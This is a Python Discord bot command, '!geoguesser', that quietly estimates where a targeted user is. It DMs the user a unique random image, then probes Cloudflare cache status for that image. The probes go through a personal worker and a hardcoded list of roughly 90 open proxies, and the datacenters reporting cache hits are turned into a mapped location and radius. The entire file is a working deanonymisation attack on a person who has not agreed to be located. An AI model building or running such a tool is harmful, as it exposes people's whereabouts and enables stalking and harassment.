"""
geoguesser.py – !geoguesser <@user>
Generates a unique random image, sends it to a target user,
pre‑caches it, then uses Cloudflare cache enumeration
from the ORD worker AND internal proxy scanner to estimate location.
Shows a live progress bar while working.
"""

import asyncio
import aiohttp
import io
import json
import random
import discord
from PIL import Image, ImageDraw
from datetime import datetime
import math
import traceback

# ============ CONFIGURATION ============
WORKER_ORD = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
WAIT_SECONDS = 25
# =======================================

COLO_COORDS = {
    'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
    'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
    'ATL': {'lat': 33.6407, 'lon': -84.4277, 'name': 'Atlanta, GA'},
    'ORD': {'lat': 41.9742, 'lon': -87.9073, 'name': 'Chicago, IL'},
    'DFW': {'lat': 32.8998, 'lon': -97.0403, 'name': 'Dallas, TX'},
    'LAX': {'lat': 33.9416, 'lon': -118.4085, 'name': 'Los Angeles, CA'},
    'SEA': {'lat': 47.4502, 'lon': -122.3088, 'name': 'Seattle, WA'},
    'MIA': {'lat': 25.7959, 'lon': -80.2870, 'name': 'Miami, FL'},
    'DEN': {'lat': 39.8561, 'lon': -104.6737, 'name': 'Denver, CO'},
    'PHX': {'lat': 33.4484, 'lon': -112.0740, 'name': 'Phoenix, AZ'},
    'SJC': {'lat': 37.3382, 'lon': -121.8863, 'name': 'San Jose, CA'},
    'PDX': {'lat': 45.5898, 'lon': -122.5951, 'name': 'Portland, OR'},
    'SLC': {'lat': 40.7608, 'lon': -111.8910, 'name': 'Salt Lake City, UT'},
    'MSP': {'lat': 44.9778, 'lon': -93.2650, 'name': 'Minneapolis, MN'},
    'STL': {'lat': 38.6270, 'lon': -90.1994, 'name': 'St. Louis, MO'},
    'BOS': {'lat': 42.3601, 'lon': -71.0589, 'name': 'Boston, MA'},
    'PHL': {'lat': 39.9526, 'lon': -75.1652, 'name': 'Philadelphia, PA'},
    'CLT': {'lat': 35.2271, 'lon': -80.8431, 'name': 'Charlotte, NC'},
    'TPA': {'lat': 27.9506, 'lon': -82.4572, 'name': 'Tampa, FL'},
    'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
}

# Curated list of HTTPS‑capable proxies
PROXY_LIST = [
    "212.113.104.29:10801","213.176.113.24:50001","43.167.173.109:8080","139.99.95.120:8080",
    "79.137.78.133:8002","64.188.77.26:3128","147.45.60.252:1081","79.133.180.232:10808",
    "8.221.126.184:80","34.94.46.8:80","178.250.156.112:443","165.138.86.202:8080",
    "95.140.154.156:1080","85.234.100.149:1080","129.226.127.245:18080","129.226.72.101:18080",
    "103.237.102.191:11111","185.105.184.45:1110","138.124.26.19:1080","31.76.29.13:8080",
    "217.144.187.80:1080","43.130.231.201:8080","178.130.47.42:1081","181.39.25.196:8118",
    "103.43.191.71:8888","34.43.46.91:80","159.195.49.27:8888","103.204.211.48:32255",
    "45.43.60.220:8080","94.103.13.179:40001","79.110.49.147:8080","81.177.165.209:10808",
    "203.175.126.229:8000","47.253.201.85:7890","149.28.87.103:8888","103.81.194.167:8080",
    "95.216.22.149:8095","178.130.47.41:1081","78.26.146.16:443","186.241.90.120:7890",
    "178.130.47.50:1081","31.76.10.209:8080","220.128.223.136:8085","185.239.50.122:10808",
    "167.86.91.238:80","198.89.96.140:808","185.142.156.229:2080","202.28.194.139:31280",
    "91.142.75.202:1080","34.134.231.117:3129","176.99.134.183:8090","178.128.59.180:18080",
    "64.188.77.221:3128","5.189.159.180:80","92.118.234.124:1080","128.140.113.110:8081",
    "43.160.255.142:7890","140.245.99.105:7890","202.58.77.239:8080","101.36.109.77:8118",
    "103.69.96.15:8888","5.35.71.232:10808","5.161.50.82:8118","147.45.60.249:1081",
    "20.83.140.251:8080","8.219.97.248:80","109.120.184.202:1080","164.52.11.194:18080",
    "95.163.234.50:10808","3.211.120.181:443","204.168.225.55:8888","147.45.60.241:1081",
    "113.160.132.26:8080","43.203.195.46:80","64.112.184.210:3128","173.212.245.136:8888",
    "51.79.199.104:3128","185.191.239.97:1080","81.168.119.85:443","46.39.105.157:8080",
    "103.240.6.107:51565","174.137.134.182:2999","110.49.66.210:8080","178.130.47.43:1082",
    "203.162.13.26:6868","70.34.252.68:1080","81.88.26.104:3128",
]

def generate_random_image():
    """Generate a 64x64 PNG with random pixels + random lines – totally unique each time."""
    w, h = 64, 64
    img = Image.new('RGB', (w, h))
    pixels = img.load()
    for x in range(w):
        for y in range(h):
            pixels[x, y] = (random.randint(0, 255),
                           random.randint(0, 255),
                           random.randint(0, 255))
    draw = ImageDraw.Draw(img)
    for _ in range(8):
        x1, y1 = random.randint(0, w), random.randint(0, h)
        x2, y2 = random.randint(0, w), random.randint(0, h)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255)), width=2)
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    return img_bytes

def haversine(lat1, lon1, lat2, lon2):
    """Distance in miles between two coordinates."""
    R = 3959
    lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
    return R * 2 * math.asin(math.sqrt(a))

async def safe_send_embed(channel, embed):
    """Send an embed compatible with both old and new discord.py."""
    try:
        return await channel.send(embed=embed)
    except TypeError:
        return await channel.send(embeds=[embed])

async def scan_via_proxies(image_url):
    """
    Use the internal proxy list to probe the image URL from different locations.
    Returns a dict with the same structure as the worker.
    Never raises an exception; returns partial/empty data on failure.
    """
    results = []
    sem = asyncio.Semaphore(20)

    async def fetch_one(proxy):
        async with sem:
            try:
                proxy_url = f"http://{proxy}"
                async with aiohttp.ClientSession() as session:
                    async with session.get(image_url, proxy=proxy_url,
                                           timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        cf_ray = resp.headers.get('cf-ray', '')
                        cache_status = resp.headers.get('cf-cache-status', 'MISS')
                        colo = cf_ray.split('-')[-1] if '-' in cf_ray else 'UNKNOWN'
                        return (colo, cache_status)
            except Exception:
                return None

    tasks = [fetch_one(p) for p in PROXY_LIST]
    raw_responses = await asyncio.gather(*tasks)

    full_results = []
    for proxy, res in zip(PROXY_LIST, raw_responses):
        if res is not None:
            colo, status = res
            full_results.append({"colo": colo, "status": status, "hit": status == "HIT"})
        else:
            full_results.append({"colo": "UNKNOWN", "status": "ERROR", "hit": False})

    datacenters = list(set(r['colo'] for r in full_results if r['hit']))
    return {
        "url": image_url,
        "checked": len(full_results),
        "hits": len(datacenters),
        "datacenters": datacenters,
        "full_results": full_results
    }

async def run(client, message, args):
    if not args.strip():
        await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
        return

    target_arg = args.strip().split()[0]
    try:
        if target_arg.startswith('<@') and target_arg.endswith('>'):
            user_id = int(target_arg.strip('<@!>'))
        else:
            user_id = int(target_arg)
        target = await client.fetch_user(user_id)
    except (ValueError, discord.NotFound):
        await message.channel.send("❌ Invalid user ID or mention.")
        return

    # Progress bar settings
    steps = [
        "Generate unique image",
        "Upload to Discord CDN",
        "Send image to target",
        f"Wait {WAIT_SECONDS}s for cache",
        "Enumerate cache (ORD worker + proxies)"
    ]
    total_steps = len(steps)
    bar_length = 12  # length of the progress bar in characters
    status_msg = None

    async def _update_progress(current_step, extra_lines=None):
        nonlocal status_msg
        filled = int((current_step / total_steps) * bar_length)
        bar = "▓" * filled + "░" * (bar_length - filled)
        progress_text = f"Progress: [{bar}] {current_step}/{total_steps}\n"
        # Add completed steps with checkmark
        for i, step in enumerate(steps[:current_step]):
            progress_text += f"✅ {step}\n"
        # Add current step with hourglass
        if current_step < total_steps:
            progress_text += f"⏳ {steps[current_step]}\n"
        # Add any extra information (like error messages or sub-steps)
        if extra_lines:
            for line in extra_lines:
                progress_text += f"{line}\n"
        try:
            if status_msg is None:
                status_msg = await message.channel.send(progress_text)
            else:
                await status_msg.edit(content=progress_text)
        except discord.NotFound:
            # If old message vanished, send a new one
            status_msg = await message.channel.send(progress_text)
        except Exception:
            pass  # never crash on progress update failure

    try:
        # Step 1: Generate image
        await _update_progress(0)
        img_bytes = generate_random_image()
        await _update_progress(1)

        # Step 2: Upload to CDN
        image_url = None
        try:
            sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
            if not sent.attachments:
                await message.channel.send("❌ No attachment URL returned.")
                return
            image_url = sent.attachments[0].url
            # Delete the temporary upload (ignore errors)
            try:
                await sent.delete()
            except Exception:
                pass
            await _update_progress(2)
        except Exception as e:
            await message.channel.send(f"❌ Failed to upload image: {e}")
            return

        # Pre-cache (optional, not a main step)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(image_url, timeout=10) as resp:
                    if resp.status == 200:
                        await resp.read()
        except Exception:
            pass

        # Step 3: DM the image
        await _update_progress(2, extra_lines=["📤 Sending DM..."])  # still step 2 because we finished it; we'll update to step 3 after
        img_bytes.seek(0)
        try:
            await target.send(file=discord.File(img_bytes, filename="geo.png"))
            await _update_progress(3)
        except discord.Forbidden:
            await message.channel.send("❌ Cannot DM that user (DMs closed).")
            return
        except Exception as e:
            await message.channel.send(f"❌ DM failed: {e}")
            return

        # Step 4: Wait
        await _update_progress(3, extra_lines=[f"⏳ Waiting {WAIT_SECONDS} seconds..."])
        await asyncio.sleep(WAIT_SECONDS)
        await _update_progress(4)

        # Step 5: Enumerate cache (both sources)
        api_ord = f"{WORKER_ORD}?url={image_url}"

        async def fetch_ord():
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(api_ord, timeout=35) as resp:
                        if resp.status == 200:
                            return await resp.json()
            except Exception:
                return None

        # Start both scans concurrently
        data_ord, data_proxy = await asyncio.gather(
            fetch_ord(),
            scan_via_proxies(image_url)
        )
        await _update_progress(4, extra_lines=["🔍 Cache scan complete."])

        # Merge results (same as before)
        datacenters = []
        hits = 0
        checked = 0
        full_results = []
        for data in [data_ord, data_proxy]:
            if data:
                dcs = data.get('datacenters', [])
                for dc in dcs:
                    if dc not in datacenters:
                        datacenters.append(dc)
                hits += data.get('hits', 0)
                checked += data.get('checked', 0)
                full_results.extend(data.get('full_results', []))

        raw_json = json.dumps({"datacenters": datacenters, "full_results": full_results}, indent=2)
        if len(raw_json) > 1000:
            raw_json = raw_json[:1000] + "\n... (truncated)"

        probed_colos = []
        seen = set()
        for r in full_results:
            colo = r.get('colo', '???')
            if colo not in seen:
                seen.add(colo)
                probed_colos.append(f"{colo} ({r.get('status', '???')})")
        colos_text = "\n".join(probed_colos[:12]) if probed_colos else "Unknown"
        if len(probed_colos) > 12:
            colos_text += f"\n... and {len(probed_colos)-12} more"

        description = (
            f"**Target:** {target.name}\n"
            f"**Image URL:** [Link]({image_url})\n"
            f"**Sources:** ORD worker + proxy scanner\n"
            f"**Pre-cached:** ✅\n"
            f"**Datacenters with HIT:** {len(datacenters)}\n"
            f"**Estimated radius:** ~"
        )

        if not datacenters:
            embed = discord.Embed(
                title="📍 GeoGuesser – No Cache Hits",
                description=description + "N/A",
                color=0xffa500,
                timestamp=datetime.now()
            )
            embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
            embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
            embed.set_footer(text="No cache entry found. Target may not have downloaded the image.")
            await safe_send_embed(message.channel, embed)
            return

        coords = []
        colo_names = []
        for colo in datacenters:
            if colo in COLO_COORDS:
                coords.append(COLO_COORDS[colo])
                colo_names.append(f"{colo} ({COLO_COORDS[colo]['name']})")
            else:
                colo_names.append(colo)

        if not coords:
            embed = discord.Embed(
                title="📍 GeoGuesser – Unknown Datacenters",
                description=description + "N/A",
                color=0xffa500,
                timestamp=datetime.now()
            )
            embed.add_field(name="🌐 HIT Datacenters", value=", ".join(datacenters), inline=False)
            embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
            embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
            await safe_send_embed(message.channel, embed)
            return

        # Compute center and radius
        center_lat = sum(c['lat'] for c in coords) / len(coords)
        center_lon = sum(c['lon'] for c in coords) / len(coords)
        max_dist = max(haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords)
        radius_miles = max_dist * 1.5 if max_dist > 0 else 250

        markers = '|'.join([f"{c['lat']},{c['lon']},red-pushpin" for c in coords])
        map_url = f"https://staticmap.openstreetmap.de/staticmap.php?center={center_lat},{center_lon}&zoom=5&size=600x400&markers={markers}&maptype=mapnik"

        description += f"{radius_miles:.0f} miles"

        embed = discord.Embed(
            title="📍 GeoGuesser – Combined Location Estimate",
            description=description,
            color=0x00ff00,
            timestamp=datetime.now()
        )
        embed.add_field(name="🌐 HIT Datacenters", value="\n".join(colo_names[:12]) +
                        ("" if len(colo_names) <= 12 else f"\n... and {len(colo_names)-12} more"), inline=False)
        embed.add_field(name="📊 Scan Stats", value=f"Checked: {checked}\nHits: {hits}", inline=True)
        embed.add_field(name="📍 Center", value=f"{center_lat:.4f}, {center_lon:.4f}", inline=True)
        embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
        embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
        embed.set_footer(text="Powered by Cloudflare Cache Enumeration (dual‑source)")
        embed.set_image(url=map_url)

        # Final update: show "Done" on progress bar, then send the embed
        await _update_progress(total_steps, extra_lines=["✅ All done. See results below."])
        await safe_send_embed(message.channel, embed)

    except Exception as e:
        traceback.print_exc()
        error_msg = f"⚠️ Unexpected error: {e}"
        try:
            await message.channel.send(error_msg)
        except Exception:
            pass
